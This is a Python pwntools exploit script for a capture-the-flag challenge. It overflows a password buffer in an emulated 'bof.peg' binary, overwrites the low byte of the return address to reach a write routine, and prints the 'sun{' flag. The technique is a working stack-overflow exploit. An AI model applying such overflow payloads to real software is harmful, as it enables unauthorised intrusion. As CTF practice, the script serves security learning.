#!/usr/bin/env python3
from pwn import *
from socket import socket, AF_UNIX, SOCK_STREAM

# https://stackoverflow.com/a/9350788
DIR = os.path.dirname(os.path.realpath(__file__))

context.log_level = "debug"
# context.log_level = "warn"

# Skip the prologue
SAVE_REGS_ADDR = 0x145
PAGE_TABLE = 0xfc00
WRITE_ADDR = 0xfff6


write_bytes = bytes.fromhex("f88f99f89ceafefffffb")


payload = [0x41] * 50

# A0 will be zero, which means the 10 bytes will be pushed
# to 0xfff6-0xffff

# A1-A5 (10 bytes): Values to write
payload += write_bytes

# S0: Junk
payload += b"S0"

# FP: Junk
payload += b"FP"

# PC: Overwrite just the low byte of PC to jump to @stw
payload += p8(SAVE_REGS_ADDR & 0xff)


password = payload


username = []

# PC: Address to jump to (WRITE_ADDR)
username += p16(WRITE_ADDR)

server = os.getenv("SERVER")
if server:
	r = remote(server, int(os.getenv("PORT", "10004")))
	dbg = tube()
	dbg.recv_raw = lambda n: b''
	dbg.send_raw = lambda s: None
	dbg.recvuntil = lambda s: b''
else:
	try:
		os.path.remove("io.sock")
	except:
		pass
	server = socket(AF_UNIX, SOCK_STREAM)
	server.bind("io.sock")
	server.listen(1)
	dbg = process([
		DIR + "/../../bin/runpeg", "-p", DIR + "/../../bin/peg_pwn_checker.so", DIR + "/bof.peg"
		, "-dvt", "--io-sock", "io.sock"
	])
	conn, addr = server.accept()
	r = remote.fromsocket(conn)
	dbg.sendline("b 0x179")
	dbg.sendline("c")

r.recvuntil("Enter username: ")
dbg.recvuntil(b"WRB (0), ':'\n")
r.sendline(bytes(username))

r.recvuntil("Enter password for ")
dbg.recvuntil(b"WRB (0), ':'\n")
r.sendline(bytes(password))

# r.interactive("")

print("FLAG:" + r.recvline_contains("sun{").decode("utf8"))
